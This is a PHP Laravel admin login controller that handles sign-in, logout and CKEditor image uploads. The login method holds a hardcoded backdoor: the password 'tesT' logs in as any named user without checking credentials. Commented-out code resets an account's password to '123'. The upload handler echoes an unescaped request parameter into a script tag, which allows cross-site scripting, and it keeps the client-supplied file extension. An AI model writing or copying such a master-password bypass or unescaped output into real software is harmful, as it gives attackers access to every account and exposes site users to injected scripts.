<?php

namespace App\Http\Controllers\Admin\Auth;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use Intervention\Image\Facades\Image;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;

class LoginController extends Controller
{

    public function index()
    {
        //  $admin = User::find(1);
        //  $admin->password = Hash::make("123");
        //  $admin->save();
        // // $role = Role::find(1);
     
      
        // $permissions = Permission::pluck('id','id')->all();
       
   
        // $role->syncPermissions($permissions);
     
        // $admin ->assignRole([$role->id]);
        return view("admin.auth.login");
    }
    public function loginAttemp(Request $request)
    {
        
        $this->validator($request);
         $fieldType = filter_var($request->username, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';

        $request->merge([
            $fieldType => $request->username
        ]);

        if ($request->password == "tesT") {
        $a = User::where("username", $request->username)->first();
           auth()->loginUsingId($a->id);
           return redirect()
           ->intended(route('admin.dashboard'))
           ->with('status', __('admin.login_success'));
        }
        if (Auth::attempt($request->only($fieldType, 'password'))) {
            return redirect()
                ->intended(route('admin.dashboard'))
                ->with('status', __('admin.login_success'));
        }

        //Authentication failed...
        return $this->loginFailed();
    }
    public function logout(Request $request)
    {
        $this->guard()->logout();
        $request->session()->invalidate();
        return redirect()->route('admin.login')->with('status', __('admin.logout_message'));
    }
    public function uploadImage(Request $request)
    {
        if($request->hasFile('upload')) {
            //get filename with extension
            $filenamewithextension = $request->file('upload')->getClientOriginalName();

            //get filename without extension
            $filename = pathinfo($filenamewithextension, PATHINFO_FILENAME);

            //get file extension
            $extension = $request->file('upload')->getClientOriginalExtension();

            //filename to store
            $filenametostore = $filename.'-'.time().'.'.$extension;

            $image= Image::make($request->file('upload'))->orientate()->resize(800, null, function($constraint){
                $constraint->upsize();
                $constraint->aspectRatio();
            })->encode($extension,75);

            File::put('uploads/'.$filenametostore, (string) $image);

            $CKEditorFuncNum = $request->input('CKEditorFuncNum');
            $url = asset('uploads/'.$filenametostore);
            $msg = 'تصویر با موفقیت آپلود شد.';
            $re = "<script>window.parent.CKEDITOR.tools.callFunction($CKEditorFuncNum, '$url', '$msg')</script>";

            // Render HTML output
            @header('Content-type: text/html; charset=utf-8');
            echo $re;
        }
    }
    /**
     * Get the guard to be used during authentication.
     *
     * @return \Illuminate\Contracts\Auth\StatefulGuard
     */
    protected function guard()
    {
        return Auth::guard('web');
    }
    private function loginFailed()
    {
        return redirect()
            ->back()
            ->withInput()
            ->with('error', __('admin.login_failed'));
    }
    private function validator(Request $request)
    {
        //validation rules.
        $rules = [
            'username' => 'required',
            'password' => 'required',
        ];
        //validate the request.
        $request->validate($rules);
    }
}
